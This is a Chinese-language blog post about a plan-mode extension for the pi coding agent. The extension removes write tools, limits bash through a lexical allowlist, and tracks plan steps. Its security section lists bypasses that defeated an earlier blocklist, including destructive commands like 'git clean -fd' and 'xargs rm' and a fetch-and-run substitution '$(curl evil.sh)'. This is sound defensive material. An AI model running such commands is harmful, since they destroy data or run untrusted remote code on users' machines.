---
title: Plan Mode：先想清楚，再动手改
date: 2026-07-19
tags: [Plan, Workflow, Extension]
---

> `/plan` 的价值不是多一个命令，而是给 agent 一套「先调研再动工」的制度：写工具暂时没收，计划可见可批，执行进度可盯。

## 问题背景

让 agent 直接改代码，常见失败模式不是「写不出代码」，而是：

1. **过早动手**：仓库还没摸清就 edit，改错层、改错文件
2. **范围失控**：一个小需求扯出半个重构
3. **进度不可见**：用户不知道它做到第几步，只能看流水日志
4. **上下文压缩丢状态**：长任务 compaction 之后，计划记忆蒸发

Plan Mode 要解决的是工作流问题，不是又一个生成器：

> 先只读探索 → 产出可审批的编号计划 → 用户点头后再全工具执行 → 用 `[DONE:n]` 推进进度。

这和人类工程师的习惯一致：复杂改动先写方案，再开干。  
`@piex-dev/plan` 把这套流程做成 pi 扩展：`/plan` 切换模式，`/todos` 看清单，footer 上直接显示 `📋 3/5`。

```bash
pi install npm:@piex-dev/plan
```

来源上，它基于 [pi 官方 plan-mode 示例](https://pi.dev/examples/extensions/plan-mode/)，并加强了计划文件写入与 compaction 保护；交互形态比 omp 的全屏 plan overlay 更轻。

---

## 技术原理

### 1. 两种模式，两套工具边界

| 模式      | 工具                                                                    | 目的               |
| --------- | ----------------------------------------------------------------------- | ------------------ |
| Plan      | `read` / `bash`(受限) / `grep` / `find` / `ls`，**禁用** `edit`/`write` | 只收集事实、写计划 |
| Execution | 恢复全工具（含 edit/write）                                             | 按步骤改代码       |

关键不是「提示词里写请不要修改」，而是 **真正从 active tools 里拿掉写工具**。模型就算想 edit，也没有这个工具。

### 2. bash 也不能放飞：词法级安全模型

只读模式里 bash 仍在（要跑 `git status`、`ls`、只读检查）。早期版本用正则黑名单拦破坏性命令，但黑名单拦不住等价绕过：`find -delete`、`git clean -fd`、`xargs rm`、`sed -i`、`FOO=x; rm`、`$(curl evil.sh)`。

现在改成**白名单 + shell 词法分析**，默认拒绝、按规则放行：

1. **分段**：按 `;` `|` `||` `&&` 切分命令（引号/转义感知），每段独立校验
2. **结构拒绝**：重定向、子 shell、命令替换、变量赋值/展开、glob 一律不放行
3. **命令白名单**：只读命令（`cat`/`grep`/`find`/`jq`…）直接放行；结构化命令带专属参数校验器：
   - `git`：仅 `status`/`log`/`diff`/`show`/`branch`/`remote`/`ls-files`/`grep`/`rev-parse` 等只读子命令，且防 `--textconv`/`--output` 等可执行外部命令或写盘的参数
   - `find`：禁 `-exec`/`-delete`；`sed`：仅 `-n` 的 `Np` 打印；`sort`：禁 `-o`
   - `npm`：仅 `ls`/`view`/`test` 等；`tsc --noEmit`、`cargo test` 等只读校验

从「拦已知坏」换成「只放已知好」，绕过面从等价变形枚举收敛到白名单本身。

### 3. 计划与提问都走结构化工具

模型不再靠「在正文里写 Plan: 标题」碰运气，而是用两个专用工具：

- `plan_question`：探索中遇到无法从仓库回答的偏好/取舍时，向用户提 1-3 个带 2-4 选项的问题（UI 选择 + Other 自由输入）
- `plan_complete`：计划决策完备后单独调用提交完整 Markdown 计划（内含 `Plan:` 编号步骤），`terminate: true` 结束该轮

计划文本从工具参数直接拿到，不再依赖正文正则；`Plan:` 标题正则保留为 fallback。

### 4. 计划如何变成 Todo

模型被要求输出：

```text
Plan:
1. …
2. …
3. …
```

扩展在 `turn_end` 解析编号列表，生成 `TodoItem[]`。

### 5. 状态如何扛住 compaction

会话一长，pi 可能压缩历史。只靠聊天记录里的「Plan:」文本会丢。  
做法是：

- `pi.appendEntry("plan-mode", { enabled, todos, executing, ... })` 把结构化状态写入 session 自定义条目
- 同时把计划落到工作区 `PLAN.md`
- 恢复会话时读回状态，重建 footer / widget

**系统状态进 appendEntry，给人看的计划进 PLAN.md**，两边分工清晰。

### 6. 指令走 systemPrompt，不污染历史

`before_agent_start` 时不再往消息流里注入 context 消息，而是直接返回追加后的 `systemPrompt`：

- 计划模式：追加模式规则、结构化工具用法、`Plan:` 输出格式
- 执行模式：追加剩余步骤列表与「完成后打 `[DONE:n]`」约定

系统提示每个 turn 重建，指令永远是最新的；消息历史里不留任何 plan 制品，也就不需要事后过滤。`context` 钩子只负责清扫**旧会话**残留的历史制品（注入消息、DONE 提醒、已结束的执行指令），保证升级后旧 session 依然干净。

---

## 实现方案

包路径：[`packages/plan`](https://github.com/piex-dev/piex/tree/main/packages/plan)，入口约 1430 行单文件。

### 用户路径

```
/plan
  → 只读探索（plan_question 澄清关键决策）
  → plan_complete 提交完整计划（含 Plan: 编号步骤）
  → UI 提供 Execute / Stay / Refine 一类选择
  → Execute：打开全工具，按步执行
  → [DONE:n] 推进
  → 全部完成提示 Plan Complete
```

辅助命令：

- `/todos`：开关 todo widget 显示
- CLI flag `plan`：启动即进入 plan mode

### 用到的 pi Extension API（精选）

| 能力          | API                                                    |
| ------------- | ------------------------------------------------------ |
| 命令          | `registerCommand("plan" / "todos")`                    |
| 结构化工具    | `registerTool("plan_complete" / "plan_question")`      |
| 快捷键        | `registerShortcut`                                     |
| 工具集切换    | `setActiveTools` / `getActiveTools`                    |
| 拦截危险 bash | `on("tool_call")` → `block`                            |
| 注入系统提示  | `on("before_agent_start")` → `systemPrompt`            |
| 解析完成标记  | `on("turn_end")`                                       |
| 交互          | `ctx.ui.select` / `editor` / `setStatus` / `setWidget` |
| 持久化        | `appendEntry`                                          |

这是 piex 里「扩展 API 用得最全」的包之一，很适合当扩展编写教材。

### 工具集合并策略

进入 plan 时会记住 `toolsBeforePlanMode`。  
计划工具集 =（原 active 去掉 edit/write）∪ 只读工具集。  
退出时尽量恢复进入前的集合，并保留其它扩展注册的额外工具（不在 managed 集合里的名字会保留）。  
这样和 hashline/lsp/dap 共存时，不会把别人的工具误杀光。

### 与 omp 的差异（有意做轻）

| omp                      | piex plan               |
| ------------------------ | ----------------------- |
| 全屏 plan-review overlay | `select` 三选项级交互   |
| Plan TOC 侧栏            | 无（pi API 限制）       |
| 子 agent plan handoff    | 无（依赖未来 subagent） |
| write 禁用               | 一致                    |

轻量的好处是：依赖面小、行为可预测、和上游 pi 示例同源好维护。

---

## 设计参考

| 项目                                                                            | 机制                                                                                                                   | piex 取舍                                                                                                                                                                                                                    |
| ------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **pi 官方 plan-mode 示例**                                                      | `registerCommand("plan")` + `setActiveTools` + `tool_call` 拦截 bash                                                   | **采纳**核心 API 方案：工具切换、bash 拦截、`[DONE:n]` 标记解析。**增强**：`appendEntry` 跨 turn 持久化 + PLAN.md 落盘 + UI widget                                                                                           |
| **oh-my-pi plan**                                                               | 全屏 plan-review overlay + TOC 侧栏 + 子 agent handoff                                                                 | **不采纳**：pi API 不支持全屏 overlay，且子 agent 未就绪。**借鉴**：步骤审批（改为 `select` 交互）、工具白名单可配置、与 `/review` 联动                                                                                      |
| **[pi-extensions `pi-plan-mode`](https://github.com/narumiruna/pi-extensions)** | shell 词法级 bash 白名单、结构化 `plan_mode_question`/`plan_mode_complete` 工具、`systemPrompt` 注入、context 制品清扫 | **采纳**全部四项（替代正则黑名单、正文正则解析与消息注入）；**不采纳**：settings 文件与遗留配置迁移（piex 无对应历史负担）、thinking level 固定（与执行跟踪场景不匹配）、放弃执行进度跟踪（piex 保留 `[DONE:n]` 差异化能力） |

核心取舍：坚持 pi 示例同源路线（轻、可预测、好维护），放弃 omp 式重 UI；用 `appendEntry` 扛 compaction 而不是 TUI 持久化。

## 版本迭代

| 版本          | 安全模型         | 计划/提问                                  | 指令注入       | 说明                                                                                             |
| ------------- | ---------------- | ------------------------------------------ | -------------- | ------------------------------------------------------------------------------------------------ |
| 0.1.1         | 正则黑名单       | 正文 `Plan:` 标题正则                      | `context` 消息 | 拦已知坏命令；计划靠模型在正文写 `Plan:` 标题后正则提取；约束消息注入历史流                      |
| 0.2.0（当前） | shell 词法白名单 | `plan_complete`/`plan_question` 结构化工具 | `systemPrompt` | 默认拒绝、按规则放行；计划与提问走专用工具参数；指令每 turn 重建系统提示，消息历史不留 plan 制品 |

0.1.1 的教训：正则黑名单拦不住等价绕过（`find -delete`、`$()`、`;` 拼接），正文正则提取计划在模型不按格式输出时会漏，`context` 消息注入的约束会被 compaction 吞掉、也成了需要清扫的制品。0.2.0 三处一起换成结构化方案：白名单收敛绕过面、工具参数取代正文解析、systemPrompt 取代消息注入，整类边界问题随之消失。

## 优化计划

Plan Mode 解决的是制度，不是魔法；边界清楚，后续也围绕这些边界加厚：

1. **`[DONE:n]` 靠自觉**  
   漏标、错标时进度会漂，也没有和 diff/测试的硬校验。  
   → 做弱验证：步骤里点名的文件若 working tree 完全未动，提示「标了 DONE 但无变化」。

2. **Refine 偏浅**  
   相对 omp 的段落级审批与 TOC，现在只有轻量选择。  
   → 在 pi API 能力范围内加强审批，而不是重做全屏 overlay。

3. **白名单不是沙箱**  
   bash 白名单把绕过面收敛到放行规则本身，但放行规则仍需持续审计（如 `npm test` 可触发任意脚本）。  
   → 白名单可配置（例如 plan 阶段允许 `lsp`、收紧 bash），并在文档里把「降风险 ≠ 隔离」写死。

4. **单会话顺序执行**  
   大任务拆 subagent 不在本包范围。  
   → 先与 `/review` 收尾联动（plan → exec → review）；并行执行等子 agent 机制成熟再接。

另外可约定 `PLAN.md` frontmatter（目标、非目标、风险），方便人和自动化同读一份计划。

---

## 附录：pi plan 生态能力逐项对比

> 四个项目（omp / pi 官方示例 / pi-extensions `pi-plan-mode` / piex plan）的客观能力差异。piex 的取舍见正文「设计参考」。

| 能力                 | omp plan-mode               | pi plan-mode 示例 | pi-extensions `pi-plan-mode`                    | piex plan                            |
| -------------------- | --------------------------- | ----------------- | ----------------------------------------------- | ------------------------------------ |
| /plan 命令           | ✅                          | ✅                | ✅                                              | ✅                                   |
| 危险 bash 拦截       | ✅ 正则匹配                 | ✅                | ✅ shell 词法白名单                             | ✅ shell 词法白名单（移植）          |
| git 子命令白名单     | —                           | —                 | 9 内置 + 6 可配置（settings 开启）              | 15 内置全开                          |
| gh 命令              | ❌                          | ❌                | ✅ `pr/issue view/list`（要求 `--json`）        | ❌                                   |
| 结构化计划/提问工具  | ❌                          | ❌                | ✅ `plan_mode_complete` / `plan_mode_question`  | ✅ `plan_complete` / `plan_question` |
| 提问工具 description | —                           | —                 | 可选                                            | 必填                                 |
| 指令注入             | context 消息                | context 消息      | `systemPrompt`                                  | `systemPrompt`                       |
| Prompt 风格          | —                           | —                 | Codex 三阶段对话式                              | 规则式                               |
| 正文 Plan: 解析      | ✅                          | ✅                | ✅ `agent_end` legacy fallback                  | ✅ 工具参数 + 正则 fallback          |
| Todo 提取            | ✅ 编号列表 + 标题解析      | ✅ 编号列表       | ❌（不提取 todo）                               | ✅ 工具参数直取 + 正则 fallback      |
| 执行进度追踪         | ✅ `[DONE:n]` 标记          | ✅                | ❌ 明确禁止（拦截 `update_plan`）               | ✅ `[DONE:n]` + todo/widget          |
| Implement 入口       | ✅                          | ✅                | 关闭模式 + 发计划消息，自由执行                 | ✅ 提取 todo → 切全工具 → 逐步推进   |
| Footer 状态          | ✅ ⏸ plan / 📋 n/m          | ✅                | ✅                                              | ✅                                   |
| Widget 进度          | ✅ todo 列表                | ✅                | ❌                                              | ✅                                   |
| 状态持久化           | ✅ appendEntry              | ✅                | ✅ appendEntry（`latestPlan`/`awaitingAction`） | ✅ appendEntry + PLAN.md             |
| 会话恢复             | ✅ 扫描消息重建状态         | ✅                | ✅                                              | ✅                                   |
| 写计划到文件         | ✅ local:// 协议            | ❌                | ❌                                              | ✅ PLAN.md                           |
| 计划审批弹窗         | ✅ plan-review-overlay 全屏 | ❌                | ✅ select                                       | ❌ select 替代                       |
| Plan TOC 侧栏        | ✅ 目录导航 + 删除段落      | ❌                | ❌                                              | ❌ pi API 限制                       |
| 子 agent 计划传递    | ✅ plan-handoff             | ❌                | ❌                                              | ❌ 依赖 subagent                     |
| Compaction 保护      | ✅ 计划文件不被清理         | ❌                | ✅ appendEntry                                  | ✅ appendEntry                       |
| Settings 文件        | ❌                          | ❌                | ✅ `pi-plan-mode.json` + legacy 迁移            | ❌                                   |
| Thinking level 覆盖  | ❌                          | ❌                | ✅ 可经 settings 固定                           | ❌                                   |
| 工具策略分类         | 二级                        | 二级              | 四级（read-only/limited/user-opt-in/blocked）   | 二级                                 |
| 工具选择 UI          | ❌                          | ❌                | ✅ 分页选择器                                   | ❌                                   |
| Context 清扫         | —                           | —                 | 主动剥离历史计划块 + 工具调用                   | 剥离 customType 制品                 |
| 快捷键               | Shift+P                     | Ctrl+Alt+P        | —                                               | 无                                   |
